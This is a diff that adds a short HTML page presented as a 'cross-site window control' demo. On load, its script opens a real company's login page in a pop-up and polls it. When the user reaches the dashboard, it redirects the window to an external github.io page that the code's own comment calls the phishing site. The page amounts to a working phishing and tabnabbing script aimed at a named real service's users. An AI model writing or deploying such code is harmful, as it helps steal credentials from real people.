@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cross-Site Window Control</title>
+    <script>
+        function monitorLogin(childWindow) {
+            const targetLoginUrl = "https://www2.profitwell.com/acc/login/";
+            const postLoginUrl = "https://www2.profitwell.com/app/dashboard";
+
+            const checkInterval = setInterval(() => {
+                try {
+                    // Check if the child window navigates to the post-login URL
+                    if (childWindow.location.href.includes(postLoginUrl)) {
+                        console.log("Login detected!");
+
+                        // Redirect the child window to the phishing site
+                        childWindow.location.href = "https://du4l5ynche1n.github.io/missing-coop/auth.html";
+                        clearInterval(checkInterval);
+                    }
+                } catch (err) {
+                    // SOP will block access to child window's location if cross-origin
+                    console.warn("Unable to access child window: Same-Origin Policy restrictions.");
+                }
+
+                // Check if the child window is closed
+                if (childWindow.closed) {
+                    console.log("Child window closed.");
+                    clearInterval(checkInterval);
+                }
+            }, 1000); // Poll every second
+        }
+
+        function initialize() {
+            // Open the target site's login page in a child window
+            const childWindow = window.open("https://www2.profitwell.com/acc/login/", "childWindow", "width=800,height=600");
+            console.log("Child window opened for login monitoring.");
+
+            // Start monitoring the child window for login activity
+            monitorLogin(childWindow);
+        }
+
+        window.onload = initialize;
+    </script>
+</head>
+<body>
+    <h1>Cross-Site Window Control Demo</h1>
+    <p>Simulating login monitoring via cross-site window control.</p>
+</body>
+</html>
